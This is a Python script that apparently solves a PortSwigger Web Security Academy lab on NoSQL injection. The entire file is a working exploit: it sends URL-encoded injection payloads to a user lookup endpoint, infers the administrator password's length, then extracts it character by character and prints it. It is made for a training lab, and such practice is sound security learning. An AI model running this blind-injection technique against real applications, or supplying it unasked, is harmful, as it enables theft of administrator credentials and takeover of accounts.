# Portswigger Lab: Exploiting NoSQL injection to extract data
import requests
from termcolor import colored

cookies = {"session": ""}  # Set the session value.

def get_password_length():
    for length in range(1,21):
        payload=f"administrator'+%26%26+this.password.length+%3d%3d{length}+||+'1'%3d%3d'2"
        url = f"https://web-security-academy.net/user/lookup?user={payload}"   # Change Lab URL
        response = requests.get(url, cookies=cookies)
        
        if "administrator" in response.text:
            print(colored(f"The password length is: {length}\n","green"))
            return length
        else:
            print(colored("Password Length is Wrong","red"))
            
admin_password=[]
def get_password(password_length):
    char_position = 0
    chars="abcdefghijklmnopqrstuvwxyz"

    while char_position < password_length:
        print(colored(f"\nTrying Position number {char_position+1}:\n","red")) 
        for char in chars:
            payload=f"administrator'+%26%26+this.password[{char_position}]%3d%3d'{char}"
            url = f"https://web-security-academy.net/user/lookup?user={payload}" # Change Lab URL     
            response = requests.get(url, cookies=cookies)

            if "administrator" in response.text:
                print(colored(f"Correct Character is found: {char}","green"))
                admin_password.append(char)
                char_position+=1
                break
            else:
                print(colored(f"Wrong Character: {char}","red"))
                
    password = ''.join(admin_password)
    print(colored(f"Admin password: {password}","cyan"))   
    
     
def main():            
    password_length = get_password_length()
    get_password(password_length)
    
if __name__ == '__main__':
    main()
